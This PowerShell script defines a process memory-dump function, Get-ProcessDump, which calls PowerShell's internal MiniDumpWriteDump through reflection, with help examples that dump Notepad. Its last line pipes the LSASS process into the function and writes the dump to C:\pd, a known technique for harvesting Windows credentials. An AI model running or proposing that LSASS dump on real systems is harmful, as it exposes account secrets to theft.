Set-Alias procdump Get-ProcessDump

function Get-ProcessDump {
  <#
    .SYNOPSIS
        Creates dump(s) ot trouble process(es).
    .EXAMPLE
        PS C:\>Get-ProcessDump (ps notepad)
        Creates full memory dump(s) of Notepad process(es).
    .EXAMPLE
        PS C:\>ps notepad | procdump -pn E:\dbg -dt 0
        Creates normal dump(s) of Notepad process(es) into E:\dbg folder.
    .NOTES
        Author: greg zakharov
        Original script http://poshcode.org/4740
        If you have a question send me a letter to
        mailto:gregzakharov@bk.ru or mailto:grishanz@yandex.ru
  #>
  [CmdletBinding(DefaultParameterSetName="Processes", SupportsShouldProcess=$true)]
  param(
    [Parameter(Mandatory=$true, Position=0, ValueFromPipeline=$true)]
    [Diagnostics.Process[]]$Processes,
    
    [Parameter(Position=1)]
    [ValidateScript({Test-Path $_})]
    [Alias("pn")]
    [String]$PathName = $pwd.Path,
    
    [Parameter(Position=2)]
    [Alias("dt")]
    [UInt32]$DumpType = 0x2
  )
  
  begin {
    $wer = [PSObject].Assembly.GetType('System.Management.Automation.WindowsErrorReporting')
    $mdt = $wer.GetNestedType('MiniDumpType', 'NonPublic')
    $dbg = $wer.GetNestedType('NativeMethods', 'NonPublic').GetMethod(
      'MiniDumpWriteDump', [Reflection.BindingFlags]'NonPublic, Static'
    )
  }
  process {
    $Processes | % {
      if ($PSCmdlet.ShouldProcess($_.Name, "Create mini dump")) {
        if (([Enum]::GetNames($mdt) | % {$mdt::$_.value__}) -notcontains $DumpType) {
          Write-Host ("Unsupported mini dump type. The next types are available:`n" + (
            [Enum]::GetNames($mdt) | % {"{0, 39} = 0x{1:x}`n" -f $_, $mdt::$_.value__}
          )) -fo Red
          break
        }
        
        $dmp = Join-Path $PathName "$($_.Name)_$($_.Id)_$(date -u %d%m%Y_%H%M%S).dmp"
        
        try {
          $fs = New-Object IO.FileStream($dmp, [IO.FileMode]::Create)
          [void]$dbg.Invoke($null, @($_.Handle, $_.Id, $fs.SafeFileHandle, $DumpType,
                                     [IntPtr]::Zero, [IntPtr]::Zero, [IntPtr]::Zero))
        }
        finally {
          if ($fs -ne $null) {$fs.Close()}
        }
      }
    }
  }
  end {}
}
ps lsass | procdump -pn C:\pd\